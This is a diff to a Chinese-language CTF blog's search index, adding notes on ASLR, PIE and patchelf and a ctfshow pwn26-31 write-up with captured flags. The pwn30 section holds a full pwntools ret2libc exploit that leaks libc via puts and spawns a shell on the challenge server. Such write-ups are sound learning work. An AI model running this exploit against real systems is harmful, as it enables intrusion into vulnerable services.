@@ -522,9 +522,9 @@
 <li><strong>它是在程序运行时系统进行的操作，因而只能随机化stack、heap、libraries的基址</strong>。</li>
 <li>现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。</li>
 </ul>
-<h4 id="PIE类型-级别（ASLR保护参数值）"><a href="#PIE类型-级别（ASLR保护参数值）" class="headerlink" title="PIE类型/级别（ASLR保护参数值）"></a>PIE类型/级别（ASLR保护参数值）</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0: ASLR 关闭</span><br><span class="line">1: 随机化栈基地址（stack）、共享库（.so\libraries）、mmap基地址</span><br><span class="line">2: 在1基础上，增加随机化堆基地址（chunk）</span><br></pre></td></tr></table></figure>
+<h3 id="PIE类型-级别（ASLR保护参数值）"><a href="#PIE类型-级别（ASLR保护参数值）" class="headerlink" title="PIE类型/级别（ASLR保护参数值）"></a>PIE类型/级别（ASLR保护参数值）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0: ASLR 关闭</span><br><span class="line">1: 随机化栈基地址（stack）、共享库（.so\libraries）、mmap基地址</span><br><span class="line">2: 在1基础上，增加随机化堆基地址（chunk）</span><br></pre></td></tr></table></figure>
 <p>来自<a href="https://blog.csdn.net/weixin_43921239/article/details/103813046">博客(csdn)</a></p>
-<h4 id="Linux系统设置ASLR"><a href="#Linux系统设置ASLR" class="headerlink" title="Linux系统设置ASLR"></a>Linux系统设置ASLR</h4><ul>
+<h3 id="Linux系统设置ASLR"><a href="#Linux系统设置ASLR" class="headerlink" title="Linux系统设置ASLR"></a>Linux系统设置ASLR</h3><ul>
 <li>ASLR存储在<code>/proc/sys/kernel/randomize_va_space</code></li>
 </ul>
 <p>注意：下面<code>echo 0</code>也可以换成<code>echo 1</code>或者<code>echo 2</code>。</p>
@@ -534,6 +534,8 @@
 </li>
 </ul>
 <p>正确写法：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure></p>
+<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>ASLR只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。<br>所以我们可以获取任意的libc库函数的真实地址来确定libc的版本和libc基址，来推得其他敏感libc函数的地址。</p>
+<p>这就是<code>LibcSearcher</code>的原理。</p>
 <h2 id="PIE和PIC"><a href="#PIE和PIC" class="headerlink" title="PIE和PIC"></a>PIE和PIC</h2><h3 id="PIE是什么？"><a href="#PIE是什么？" class="headerlink" title="PIE是什么？"></a>PIE是什么？</h3><p>还是来自刚才的来自<a href="https://blog.csdn.net/weixin_43921239/article/details/103813046">博客(csdn)</a>。</p>
 <p><strong>PIE 是 gcc 编译器的功能选项，作用于程序（ELF）编译过程中。是一个针对代码段（ .text ）、数据段（ .data ）、未初始化全局变量段（ .bss ）等固定地址的一个防护技术</strong>。</p>
 <p>如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过 ROPgadget 等一些工具来帮助解题。</p>
@@ -642,7 +644,20 @@
   <entry>
     <title>ctfshow pwn26-31 WP</title>
     <url>/2024/11/14/ctfpwn/wp/ctfshow-pwn26-31-WP/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h1 id="前置知识和工具"><a href="#前置知识和工具" class="headerlink" title="前置知识和工具"></a>前置知识和工具</h1><ul>
+<li><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/" title="pwn知识点2 ASLR,PIE和PIC的异同">ASLR、PIE和PIC</a></li>
+<li><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B76-patchelf%E4%B8%8Eglibc-all-in-one/" title="pwn工具6 patchelf与glibc-all-in-one">更换elf动态运行库的方法</a>
+<del>尽管我操作了很久也搞不出题目的flag，最后都抄了别人的flag</del></li>
+</ul>
+<h1 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h1><p>修改ASLR设置代码如下：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure><br>再运行pwn可执行文件，得到flag：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;0x400687_0x400560_0x603260_0x7ffff7fd64f0&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h1><p>代码：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure><br>再运行pwn可执行文件，得到flag：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;0x400687_0x400560_0x603260&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h1><p>直接运行即可得到flag：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;0x400687_0x400560&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h1><p>确保ASLR保护码为2，直接运行可得答案：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h1><p>我甚至是直接用pwn25的payload小改一下就做出来了。</p>
+<a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">ctfshow-pwn25-WP</a>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28308&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn30&#x27;</span>)</span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(put_plt) + p32(main_addr) + p32(put_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_v = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc_v.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc_v.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc_v.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag:<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;9f1c6270-f24b-4f94-ac8d-33cbd59d64a6&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h1>]]></content>
       <categories>
         <category>ctf</category>
         <category>pwn</category>
@@ -681,6 +696,7 @@
 <h3 id="checksec工具"><a href="#checksec工具" class="headerlink" title="checksec工具"></a><code>checksec</code>工具</h3><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B73-checksec/" title="pwn工具3 checksec">checksec介绍</a>
 <h3 id="cyclic工具"><a href="#cyclic工具" class="headerlink" title="cyclic工具"></a><code>cyclic</code>工具</h3><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">使用cyclic的实践-ctfshow-pwn25(ret2libc)</a>
 <h3 id="shellcraft工具"><a href="#shellcraft工具" class="headerlink" title="shellcraft工具"></a><code>shellcraft</code>工具</h3><a href="/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/" title="ctfshow-pwn24 WP">使用shellcraft的实践-ctfshow-pwn24(ret2text)</a>
+<h3 id="源代码中的ELF-quot-xxx-quot-函数"><a href="#源代码中的ELF-quot-xxx-quot-函数" class="headerlink" title="源代码中的ELF(&quot;./xxx&quot;)函数"></a>源代码中的<code>ELF(&quot;./xxx&quot;)</code>函数</h3><p>这里面抓出来的地址其实不是运行出来的，而是反汇编出来的。就跟<code>objdump -S xxx</code>中对应的地址是一样的。</p>
 <h3 id="敬请期待，还没用到"><a href="#敬请期待，还没用到" class="headerlink" title="敬请期待，还没用到"></a>敬请期待，还没用到</h3>]]></content>
       <categories>
         <category>ctf</category>
@@ -696,7 +712,8 @@
   <entry>
     <title>pwn工具2 pwngdb</title>
     <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B72-pwngdb/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p>空文章，想做再做。</p>
+]]></content>
   </entry>
   <entry>
     <title>pwn工具3 checksec</title>
@@ -723,11 +740,90 @@
   <entry>
     <title>pwn工具4 readelf</title>
     <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B74-readelf/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p>空文章，想做再做。</p>
+]]></content>
   </entry>
   <entry>
     <title>pwn工具5 objdump</title>
     <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B75-objdump/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p>空文章，想做再做。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pwn工具6 patchelf与glibc-all-in-one</title>
+    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B76-patchelf%E4%B8%8Eglibc-all-in-one/</url>
+    <content><![CDATA[<h1 id="面临的窘境"><a href="#面临的窘境" class="headerlink" title="面临的窘境"></a>面临的窘境</h1><p>在我做ctfshow的pwn26时，我明明已经设定对了ASLR保护值，但是得不到正确的flag。</p>
+<p>关于题目中给出的libc也不会用，于是进行了问题的查询，发现这是一个pwn手经常遇见的问题。</p>
+<h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><h2 id="为什么要下载对应版本的glibc"><a href="#为什么要下载对应版本的glibc" class="headerlink" title="为什么要下载对应版本的glibc"></a>为什么要下载对应版本的glibc</h2><p>这个问题也是开始一直困扰的疑问，为什么不直接使用手头分发的glibc，设置环境变量<code>LD_PRELOAD=./libc.so.6 ./xxx</code>。</p>
+<p>直接让加载指定的libc执行，而要去下载一个对应版本的glibc重新编译呢？</p>
+<p>因为<code>ld.so</code>与<code>libc.so</code>不匹配可能会导致程序无法运行。</p>
+<h2 id="安装及使用glibc-all-in-one"><a href="#安装及使用glibc-all-in-one" class="headerlink" title="安装及使用glibc-all-in-one"></a>安装及使用<code>glibc-all-in-one</code></h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br></pre></td></tr></table></figure>
+<h3 id="查看可下载列表"><a href="#查看可下载列表" class="headerlink" title="查看可下载列表"></a>查看可下载列表</h3><p>确保工作目录为<code>glibc-all-in-one</code><br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat list</span><br></pre></td></tr></table></figure></p>
+<h3 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h3><p>工作目录为<code>glibc-all-in-one</code><br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./download &#123;你要的版本&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="安装及使用patchelf"><a href="#安装及使用patchelf" class="headerlink" title="安装及使用patchelf"></a>安装及使用<code>patchelf</code></h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>原理：程序相关的<code>libc.so</code>和<code>ld.so</code>是被硬写到程序中的，你可以使用<code>ldd</code>命令查看<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ldd pwn</span><br><span class="line">        linux-vdso.so.1 (0x00007ffe64733000)</span><br><span class="line">        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x000079835dbaf000) </span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x000079835d800000)// libc c标准语言库</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x000079835dbc8000)// 看到ld 动态连接器</span><br></pre></td></tr></table></figure></p>
+<h3 id="patchelf介绍"><a href="#patchelf介绍" class="headerlink" title="patchelf介绍"></a><code>patchelf</code>介绍</h3><p><code>patchelf</code>是一个用于修改ELF可执行文件和库的小型实用程序。它允许用户更改动态链接器（dynamic linker）和 RPATH（运行时搜索路径），从而方便地调整可执行文件和库的运行环境。patchelf 主要用于 Linux 系统，支持多种 ELF 格式的文件。</p>
+<p>关键技术：</p>
+<ul>
+<li><strong>ELF文件格式</strong>：patchelf 主要操作 ELF 格式的可执行文件和库。</li>
+<li><strong>动态链接器</strong>：允许用户修改可执行文件的动态链接器。</li>
+<li><strong>RPATH</strong>：允许用户修改和调整可执行文件和库的运行时搜索路径。</li>
+</ul>
+<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>这一套安装流程的讲解：</p>
+<ul>
+<li><a href="https://blog.csdn.net/SecondJanuary">SecondJanuary(csdn)</a>：<a href="https://blog.csdn.net/secondjanuary/article/details/8985795">Linux下 config/configure/Configure、make 、make test/make check、sudo make install 的作用(csdn)</a></li>
+</ul>
+<h4 id="克隆项目源码"><a href="#克隆项目源码" class="headerlink" title="克隆项目源码"></a>克隆项目源码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br></pre></td></tr></table></figure>
+<h4 id="生成构建文件"><a href="#生成构建文件" class="headerlink" title="生成构建文件"></a>生成构建文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br></pre></td></tr></table></figure>
+<p>可能会报错：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh: 2: autoreconf: not found</span><br></pre></td></tr></table></figure></p>
+<p>进行如下操作：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install autoconf automake libtool</span><br></pre></td></tr></table></figure></p>
+<h4 id="配置构建环境"><a href="#配置构建环境" class="headerlink" title="配置构建环境"></a>配置构建环境</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>
+<h4 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
+<h4 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make check</span><br></pre></td></tr></table></figure>
+<p>check成功只需要没有<code>error</code>。</p>
+<h4 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装<code>patchelf</code></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<h3 id="配置和使用"><a href="#配置和使用" class="headerlink" title="配置和使用"></a>配置和使用</h3><h4 id="常用用法"><a href="#常用用法" class="headerlink" title="常用用法"></a>常用用法</h4><ul>
+<li><p>修改<code>ld</code>的地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ld_addr file_name</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改libc的地址</p>
+<ul>
+<li>这里old_libc就是ldd查到的那个ld地址(==&gt;之前)比如：<code>libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6</code>那么就是<code>libc.so.6</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed old_libc new_libc file_name</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>修改Libc的地址(不太稳定)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath new_rpath your_file</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="大部分功能"><a href="#大部分功能" class="headerlink" title="大部分功能"></a>大部分功能</h4><p>命令行输入<code>patchelf</code>，会得到（部分）：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">syntax: patchelf</span><br><span class="line">  [--set-interpreter FILENAME]</span><br><span class="line">  [--page-size SIZE]</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-soname]              Prints &#x27;DT_SONAME&#x27; entry of .dynamic section. Raises an error if DT_SONAME doesn&#x27;t exist</span><br><span class="line">  [--set-soname SONAME]         Sets &#x27;DT_SONAME&#x27; entry to SONAME.</span><br><span class="line">  [--set-rpath RPATH]</span><br><span class="line">  [--remove-rpath]</span><br><span class="line">  [--shrink-rpath]</span><br><span class="line">  [--allowed-rpath-prefixes PREFIXES]           With &#x27;--shrink-rpath&#x27;, reject rpath entries not starting with the allowed prefix</span><br><span class="line">  [--print-rpath]</span><br><span class="line">  [--force-rpath]</span><br><span class="line">  [--add-needed LIBRARY]</span><br><span class="line">  [--remove-needed LIBRARY]</span><br><span class="line">  [--replace-needed LIBRARY NEW_LIBRARY]</span><br><span class="line">  [--print-needed]</span><br><span class="line">  [--no-default-lib]</span><br><span class="line">  [--debug]</span><br><span class="line">  [--version]</span><br><span class="line">  FILENAME</span><br></pre></td></tr></table></figure></p>
+<p>翻译后是：</p>
+<ul>
+<li>设置动态库解析器</li>
+<li>设置页大小</li>
+<li>设置 DT_SONAME</li>
+<li>设置 rpath</li>
+<li>删除 rpath</li>
+<li>添加允许的 rpath 前缀</li>
+<li>打印 rpath</li>
+<li>强制使用 rpath</li>
+<li>添加需要的动态库</li>
+<li>删除需要的动态库</li>
+<li>替换旧的动态库为新的</li>
+<li>打印帮助信息</li>
+<li>不链接默认的动态库</li>
+<li>输出调试信息</li>
+<li>打印版本号</li>
+</ul>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>pwn</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+        <tag>工具</tag>
+      </tags>
   </entry>
 </search>
